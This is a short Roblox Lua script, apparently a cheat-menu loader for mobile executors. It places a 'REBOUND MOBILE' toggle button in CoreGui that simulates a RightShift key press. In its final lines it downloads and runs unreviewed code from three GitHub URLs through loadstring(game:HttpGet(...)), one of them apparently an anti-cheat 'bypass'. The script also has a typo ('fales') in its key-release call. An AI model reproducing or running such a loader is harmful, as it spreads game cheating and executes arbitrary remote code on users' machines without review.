local IMAGE = "rbxassetid://2152636047"

local Positions = UDim2.new(0.822025776, 0, 0.0401606411, 0)

local Sizes = UDim2.new(0, 76, 0, 70)

local KINGHUBMOBILE = Instance.new("ScreenGui")

local _100x100 = Instance.new("Frame")

local ImageButton = Instance.new("ImageButton")

KINGHUBMOBILE.Name = "REBOUND MOBILE"

KINGHUBMOBILE.Parent = game:WaitForChild("CoreGui")

KINGHUBMOBILE.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

_100x100.Name = "100x100"

_100x100.Parent = KINGHUBMOBILE

_100x100.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

_100x100.Position = Positions

_100x100.Size = UDim2.new(0, 76, 0, 70)

ImageButton.Parent = _100x100

ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

ImageButton.Size = Sizes

ImageButton.Image = IMAGE

ImageButton.MouseButton1Down:connect(function()
	local vim = game:service("VirtualInputManager")	vim:SendKeyEvent(true, "RightShift", false, game)
	local vim = game:service("VirtualInputManager")
	vim:SendKeyEvent(fales, "RightShift", false, game)
end)
loadstring(game:HttpGet(("https://raw.githubusercontent.com/yieviro92creepy/Yedi5/main/Oo4"),true))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/PrototypeRBLX/Speed-Script/main/README.md'))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
